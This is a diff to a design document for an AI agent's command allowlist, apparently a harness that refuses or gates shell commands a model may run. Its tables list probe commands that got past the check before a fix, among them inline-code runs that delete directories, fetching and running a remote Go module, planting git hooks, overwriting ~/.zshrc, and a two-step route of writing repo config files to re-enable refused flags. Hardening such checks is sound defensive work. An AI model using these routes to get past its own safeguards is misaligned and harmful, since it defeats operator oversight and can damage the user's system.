@@ -358,25 +358,51 @@ scripts (`python3 x.py`, `node x.js`, a script path that resolves inside the
 root), test and build tools (`pytest`, `python -m pytest|unittest|py_compile|compileall|json.tool|ruff`,
 `go build|test|vet|run`, `cargo build|check|test|run`, `npm test|run`,
 `yarn test|run`, `ruff check|format`) and the wrappers `time`, `timeout` and `uv run`.
-Flags it reads on those programs:
+Rules it applies to those programs. They are general rules, not flag tables,
+because a test runner's plugins and a test binary's flags cannot be listed:
 
-- **Output and working paths must resolve inside the root** (`Path.resolve`,
-  symlinks followed): `sort -o`, `uniq IN OUT`, `tree -o`, `git --output`,
-  `git archive -o`, `go build -o` and the go profile flags, `cargo --target-dir`,
-  `pytest --basetemp/--junitxml/--rootdir`, `python -m json.tool IN OUT`,
-  `git -C/--git-dir/--work-tree`, `npm --prefix`, `yarn --cwd`, `go -C`, a
-  script path, and pytest's test paths.
+- **Every path an interpreter or test runner is given must resolve inside the root.**
+  For `python`, `node`, `pytest`, `go`, `cargo`, `uv`, `pip`, `npm`, `yarn` and
+  `ruff`, every argument, every value after `=` or `:` inside one, and everything
+  after `--` or `-args` that looks like a path (contains `/`, starts with `~`, or
+  is `..`) is resolved (`Path.resolve`, symlinks followed) and refused if it lands
+  outside the root: `pytest -o log_file=~/.zshrc`, `node --test-reporter-destination=`,
+  `go test -test.coverprofile=`, `cargo test -- --logfile`, `pip --python /x/exe`,
+  `python3 -X pycache_prefix=`. An argument built from a shell expansion needs
+  approval. The cost: a script argument that is an outside path, even one only
+  read, is refused too (`python3 s.py /etc/hosts`). Other programs have their
+  output flags read one by one: `sort -o`, `uniq IN OUT`, `tree -o`,
+  `git --output`, `git archive -o`, `git -C/--git-dir/--work-tree`.
+- **Inline code is refused in any spelling.** `python -c` attached, clustered or
+  followed by a script name (`python3 '-c…' s.py`, `python3 -Ic…`); `node -e/-p`,
+  `--eval=`, `--print=`; and a `node --require/--import/--loader` module that is
+  a `data:` or URL module, or a path outside the root.
+- **`go run|build|test|vet|list` take only local packages** (`.`, `./...`,
+  `./cmd/x`, `x.go`). A module path (`example.com/x/cmd`, `pkg@latest`) is code
+  go downloads, and it is refused.
 - **Flags that delete or run a command are refused:** `find -delete/-exec/-execdir/-ok/-fprint*`,
   `rg --pre/--pre-glob`, `sort --compress-program`, `tree -R`, `git grep --open-files-in-pager`,
-  `go -exec/-toolexec/-vettool`, `go env -w`, `cargo --config`, `npm --script-shell`,
-  an existing `pytest --basetemp` directory (pytest deletes it first), and every
+  `git diff --ext-diff`, `go -exec/-toolexec/-vettool`, `go env -w`, `cargo --config`,
+  `npm --script-shell`, `uv run --with` (it installs packages, which then run), an
+  existing `pytest --basetemp` directory (pytest deletes it first), and every
   `git -c KEY` except formatting keys (`color.*`, `log.*`, `core.quotepath`,
-  `core.pager=cat` ...): `core.pager`, `alias.*`, `core.fsmonitor`,
-  `core.sshCommand`, `diff.external` and the rest are refused.
+  `core.pager=cat` ...). `core.pager`, `alias.*`, `core.fsmonitor`,
+  `core.sshCommand`, `diff.external` and the rest are refused, attached
+  (`-ckey=v`) too.
 - **A command prefix may set only harmless variables** (`PYTHONPATH`, `NO_COLOR`,
-  `CI` ...); `GIT_EXTERNAL_DIFF=`, `PYTEST_ADDOPTS=`, `PATH=` and the like are refused.
-- **A program is judged by its name**, so `/usr/bin/crontab -r` is refused like
-  `crontab -r`.
+  `CI` ...), and a path in one must be inside the root (`PYTHONPATH=/x` is
+  refused). `GIT_EXTERNAL_DIFF=`, `PYTEST_ADDOPTS=`, `PATH=` and the like are refused.
+- **The file that runs must be a system program, in both directions.** A program
+  given as a path is refused, whatever its name (`./cat`, `src/find`,
+  `/x/python3`, `/usr/bin/python3`): a name says nothing about the file behind
+  it. A bare name runs what `PATH` finds. It is refused when `PATH` has a
+  relative entry, or when the file it finds is inside the root (a file the model
+  could have written). The one exception is a project virtualenv or
+  `node_modules/.bin`, and `uv run`'s own environment, which fall under the
+  residual below. A program off the list stays refused under any path
+  (`/usr/bin/crontab -r`).
+- **Writes into `.git` are refused**, from the file tools and from a command
+  (`echo x > .git/hooks/pre-commit`), because git runs its hooks and config.
 
 **Refused on every lane, in every configuration.** `check_action` is the last check
 on all three lanes, so these hold with `LLM_ROUTER_AGENT_WRITES=apply` and
@@ -414,8 +440,9 @@ project root and `{HOME}` is the home directory.
 | `echo x > $HOME/x` | `needs_approval` | write target built from a variable |
 
 Refused since D-322 (SAFEFIX). Each row below ran on at least one lane before
-D-322; the last column says what it did. Measured 2026-10-28 against the real
-executors (the UN-15 known-gaps table and the probe lists behind the PR #778 reviews).
+D-322; the last column says what it did. Measured 2026-10-28 and 2026-10-29 against
+the real executors (the UN-15 known-gaps table and the probe lists behind the
+reviews of PR #778 and PR #785).
 
 | command | verdict | class | what it did before D-322 |
 |---|---|---|---|
@@ -447,8 +474,8 @@ executors (the UN-15 known-gaps table and the probe lists behind the PR #778 rev
 | `git diff --output={HOME}/.zshrc` | `refuse` | output flag outside the root | overwrites a file outside the root |
 | `go build -o {HOME}/.zshrc .` | `refuse` | output flag outside the root | overwrites a file outside the root |
 | `git archive -o {OUT}/x.tar HEAD` | `refuse` | output flag outside the root | writes a file outside the root |
-| `python3 -m tarfile -e a.tar {HOME}` | `needs_approval` | `python -m` module not on the allowlist | extracts outside the root |
-| `python3 -m zipfile -e a.zip {OUT}` | `needs_approval` | `python -m` module not on the allowlist | extracts outside the root |
+| `python3 -m tarfile -e a.tar {HOME}` | `refuse` | argument outside the root | extracts outside the root |
+| `python3 -m zipfile -e a.zip {OUT}` | `refuse` | argument outside the root | extracts outside the root |
 | `git read-tree --reset -u HEAD` | `needs_approval` | git subcommand not on the allowlist | discards working-tree changes, the same effect as the refused `git reset --hard` |
 | `git checkout-index -a -f` | `needs_approval` | git subcommand not on the allowlist | overwrites working-tree changes |
 | `git --work-tree={OUT} checkout-index -a -f` | `refuse` | working path outside the root | writes the index out to a directory outside the root |
@@ -483,7 +510,7 @@ executors (the UN-15 known-gaps table and the probe lists behind the PR #778 rev
 | `pytest --basetemp=src` | `needs_approval` | pytest deletes `--basetemp` first | pytest runs `rm -rf` on an existing directory inside the root |
 | `python3 -m compileall {OUT}` | `refuse` | compile target outside the root | writes `__pycache__` outside the root |
 | `python3 -m runpy x` | `needs_approval` | `python -m` module not on the allowlist | runs a module given on the command line |
-| `python3 -m venv {OUT}/v` | `needs_approval` | `python -m` module not on the allowlist | creates an environment outside the root |
+| `python3 -m venv {OUT}/v` | `refuse` | argument outside the root | creates an environment outside the root |
 | `python3 {OUT}/s.py` | `refuse` | working path outside the root | runs a script that is not a project file |
 | `git clone . {OUT}/clone` | `needs_approval` | git subcommand not on the allowlist | writes a repository outside the root |
 | `git init {OUT}/newrepo` | `needs_approval` | git subcommand not on the allowlist | creates a repository outside the root |
@@ -493,6 +520,33 @@ executors (the UN-15 known-gaps table and the probe lists behind the PR #778 rev
 | `uv cache clean` | `needs_approval` | program or subcommand not on the allowlist | deletes the uv cache, outside the root |
 | `npm cache clean --force` | `needs_approval` | program or subcommand not on the allowlist | deletes the npm cache, outside the root |
 | `pip cache purge` | `needs_approval` | program or subcommand not on the allowlist | deletes the pip cache, outside the root |
+| `python3 '-c__import__("os").system("touch {OUT}/pwn")' s.py` | `needs_approval` | interpreter inline code (any spelling) | inline code attached to `-c`, with a script name after it |
+| `python3 -I '-c__import__("shutil").rmtree("{OUT}")' a.txt` | `needs_approval` | interpreter inline code (any spelling) | inline code inside an option cluster |
+| `node '--eval=require("child_process").execSync("touch {OUT}/pwn")' s.js` | `needs_approval` | interpreter inline code (any spelling) | `--eval=` inline code |
+| `node --print=1 s.js` | `needs_approval` | interpreter inline code (any spelling) | `--print=` inline code |
+| `node --import 'data:text/javascript,import("child_process")' s.js` | `needs_approval` | interpreter inline code (any spelling) | a `data:` module is inline code |
+| `node -r {OUT}/evil.js s.js` | `refuse` | argument outside the root | preloads code that is not a project file |
+| `pytest -o log_file={HOME}/.zshrc --co -q` | `refuse` | argument outside the root | truncates a file outside the root |
+| `python3 -m pytest -o log_file={OUT}/victim -q` | `refuse` | argument outside the root | truncates a file outside the root |
+| `pytest -o pythonpath={OUT}` | `refuse` | argument outside the root | imports code from outside the root |
+| `pytest -c {OUT}/pytest.ini` | `refuse` | argument outside the root | reads a config from outside the root |
+| `pytest --benchmark-json={OUT}/x` | `refuse` | argument outside the root | a plugin flag writes outside the root |
+| `node --test --test-reporter-destination={OUT}/victim s.js` | `refuse` | argument outside the root | overwrites a file outside the root |
+| `go test -test.coverprofile={OUT}/victim ./...` | `refuse` | argument outside the root | writes outside the root (`test.` prefix) |
+| `go test ./... -args -test.cpuprofile={OUT}/victim` | `refuse` | argument outside the root | writes outside the root (after `-args`) |
+| `cargo test -- --logfile {OUT}/victim` | `refuse` | argument outside the root | libtest writes outside the root (after `--`) |
+| `python3 -X pycache_prefix={OUT} s.py` | `refuse` | argument outside the root | writes bytecode outside the root |
+| `npm --logs-dir={OUT} test` | `refuse` | argument outside the root | writes logs outside the root |
+| `pip --python {OUT}/exe list` | `refuse` | argument outside the root | runs a file outside the root |
+| `PYTHONPATH={OUT} python3 s.py` | `refuse` | environment value outside the root | imports code (sitecustomize) from outside the root |
+| `uv run --python {OUT}/exe s.py` | `refuse` | argument outside the root | runs a file outside the root |
+| `uv run --with evilpkg pytest` | `needs_approval` | `uv run --with` installs code | installs a package from an index, which then runs |
+| `go run example.com/evil/cmd@latest` | `needs_approval` | go module path | downloads and runs code the model names |
+| `go run {OUT}/main.go` | `refuse` | argument outside the root | runs code that is not a project file |
+| `./cat a.txt` | `needs_approval` | program given as a path | runs a file named like an allowed program |
+| `{OUT}/python3 s.py` | `needs_approval` | program given as a path | runs a file named like an allowed program |
+| `echo x > .git/hooks/pre-commit` | `needs_approval` | write into `.git` | writes a hook git runs later |
+| `git diff --ext-diff` | `needs_approval` | delete, write or exec flag of an allowed program | runs the configured external diff program |
 
 File-tool writes (`write_file`, `edit_file`, the toolkit `write`) go through
 `contain`. A path that resolves outside the root is refused on every lane,
@@ -524,19 +578,31 @@ symlinks followed; a `~` path is refused rather than expanded:
 
 **This is a tripwire, not a sandbox.** Static reading of a command line cannot see
 what a permitted program does on its own. Reads outside the root and network use
-are not part of this contract. An OS-level write sandbox is 16.1. What the
-allowlist deliberately leaves running:
+are not part of this contract. An OS-level write sandbox is 16.1. No known gap
+remains from the probe lists of the PR #778 and PR #785 reviews; every command
+they found running is in the refused tables above. What the allowlist
+deliberately leaves running is an accepted residual, not a gap:
 
 - **Code the lane runs: scripts, test runners, `go run`, `cargo run`, `npm run`.**
   Running the project's own code and tests is the purpose of the lanes, so a
   project script (`python3 s.py`, `node s.js`), `pytest`, `go test`, `go run`,
   `cargo run` and `npm test`/`npm run <script>` run, and that code can do
   anything the operator can. On `llm_act` the model can write that code first
-  with `write_file` (inside the root, allowed by design) and then run it. The
-  same holds for code the repository configures for an allowed program, such
-  as git hooks or `.git/config` (`core.fsmonitor`). This is an accepted residual
-  of v16, pinned below as a by-design behaviour; containment for it is the 16.1
-  OS sandbox.
+  with `write_file` (inside the root, allowed by design) and then run it. This is
+  an accepted residual of v16, pinned below as a by-design behaviour; containment
+  for it is the 16.1 OS sandbox.
+- **Repository config files can turn a refused flag back on in two steps.** An
+  allowed program reads its own config from the project: `pyproject.toml`,
+  `pytest.ini`, `setup.cfg` and `tox.ini` (`addopts = --basetemp=…`, `log_file`),
+  `conftest.py`, `.cargo/config.toml` (`build.rustc-wrapper`), `.npmrc`
+  (`script-shell`) and `package.json` scripts. On `llm_act` the model can write
+  such a file inside the root and then run the tool, which gets past the
+  `-o addopts=`, `cargo --config` and `npm --script-shell` refusals. These are not
+  refused, for two reasons. Editing them is ordinary project work. And a refusal
+  in the file tools alone would not hold, because the in-root shell writers
+  (`tee`, `sed -i`, `>`) reach the same files. It is the same residual as the
+  item above. Writes into `.git` (hooks, `.git/config`) are the exception: git
+  needs no project file for them, so they are refused (rule above).
 - **Writes inside the root by an allowed program** (`rm a.txt`, `sed -i`,
   `git rm a.txt`, `go build`): the same reach as the lane's file tools.
 
